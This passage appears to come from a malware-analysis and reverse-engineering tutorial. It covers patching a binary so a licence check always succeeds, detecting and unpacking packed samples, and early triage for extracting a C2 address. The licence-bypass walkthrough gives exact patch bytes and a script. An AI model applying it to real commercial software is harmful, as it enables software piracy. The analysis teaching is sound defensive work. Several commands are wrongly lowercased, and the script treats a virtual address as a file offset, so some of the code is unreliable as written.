    xor_decrypt(module_name, &encrypted_blob, 0x20);
    return;
} binary patching — before and after patching a binary means modifying its instructions directly — changing a conditional jump to an unconditional one, nopping out a check, or replacing a hardcoded value. common use cases: bypassing licence checks in crackmes, neutralising self-destruct routines in malware samples, forcing code paths for analysis. example: bypassing a licence check ; function: check_licence() at 0x00401200
; goal: make the function always return 'valid' (1)
; regardless of actual licence input

; before patch — original disassembly
  00401200: push  ebp
  00401201: mov   ebp, esp
  00401203: call  verify_key_hash        ; returns 0 (invalid) or 1 (valid)
  00401208: test  eax, eax               ; is result zero?
- 0040120a: jz    0x00401230             ; if zero (invalid), jump to fail branch
  0040120c: mov   eax, 1                 ; valid path: return 1
  00401211: pop   ebp
  00401212: ret
  ...
  00401230: mov   eax, 0                 ; fail branch: return 0
  00401235: pop   ebp
  00401236: ret

; after patch — jz changed to jmp (unconditional)
  00401200: push  ebp
  00401201: mov   ebp, esp
  00401203: call  verify_key_hash
  00401208: test  eax, eax
+ 0040120a: jmp   0x0040120c             ; always jump to valid path (eb 00)
  0040120c: mov   eax, 1                 ; always reaches here now
  00401211: pop   ebp
  00401212: ret

; patch bytes at 0x0040120a:
; before: 74 24  (jz rel8 +0x24)
; after:  eb 00  (jmp rel8 +0x00 = next instruction) applying the patch # method 1: hex editor
xxd sample.exe | grep -n '74 24'   # find the bytes
# open in hexedit, navigate to offset, change 74 24 → eb 00

# method 2: python
python3 - << 'eof'
with open('sample.exe', 'r+b') as f:
    f.seek(0x40120a)        # file offset (not virtual address)
    original = f.read(2)
    print(f'original bytes: {original.hex()}')
    f.seek(0x40120a)
    f.write(b'\xeb\x00')    # jmp +0 (skip to next instruction)
    print('patch applied')
eof

# method 3: ghidra patch
# right-click instruction → patch instruction
# or use the patch bytes option and enter new bytes directly
# file → export program → original file (with patched bytes)

# method 4: x64dbg (dynamic patch)
# navigate to address, right-click → assemble
# type: jmp 0x0040120c
# file → patch file → save patched executable

# verify patch:
cmp original_sample.exe patched_sample.exe
diff <(xxd original_sample.exe) <(xxd patched_sample.exe) packed and obfuscated samples most real-world malware is packed — the original code is compressed or encrypted and unpacked at runtime. the outer binary is just a loader. indicators of packing: # identify packing
file suspicious.exe
# packed exes often show: upx compressed, or 'ms-dos executable' with suspicious entropy

# check entropy (high entropy = likely packed/encrypted)
die suspicious.exe    # 'detect it easy' — identifies packer by signature
rabin2 -s suspicious.exe | awk '{print $5,$6}' | sort -k2 -n  # section entropy
# entropy >7.0 in .text section = suspicious; normal code is ~6.0-6.5

# string output barely readable = packed
strings -n 6 suspicious.exe | wc -l   # very low count suggests packing

# upx unpack (if packer is upx — most common)
upx -d suspicious.exe -o unpacked.exe
file unpacked.exe    # should now show pe32 executable normally

# if custom packer: use dynamic approach
# 1. run in debugger
# 2. set breakpoint on virtualalloc / virtualprotect
# 3. the packer allocates memory, decrypts code into it, then jumps to it
# 4. break when execution jumps to the allocated region
# 5. dump the unpacked code from memory

# x64dbg: scylla plugin — dump unpacked pe from memory
# plugins → scylla → dump (after reaching oep) malware analysis walkthrough — extracting a c2 address a condensed real-world workflow: unknown sample, need to extract the c2 address without running the malware on an internet-connected machine. step 1 — triage # initial triage — safe, no execution
file sample.bin
# → pe32+ executable (gui) x86-64, ms windows

md5sum sample.bin; sha256sum sample.bin
# hash for threat intel lookup

# check virustotal hash (if not client-confidential)
curl -s 'https://www.virustotal.com/api/v3/files/sha256hash' \
  -h 'x-apikey: your_key' | python3 -m json.tool | grep -a3 'last_analysis_stats'

# strings — look for urls, ips, registry paths, mutex names
strings -n 8 sample.bin | grep -ie 'http|cmd|powershell|user-agent|\\software'
# → user-agent: mozilla/5.0 (compatible; msie 9.0)
# → http://[redacted]/update
# → software\microsoft\windows\currentversion\run

# imports — what win32 apis does it call?
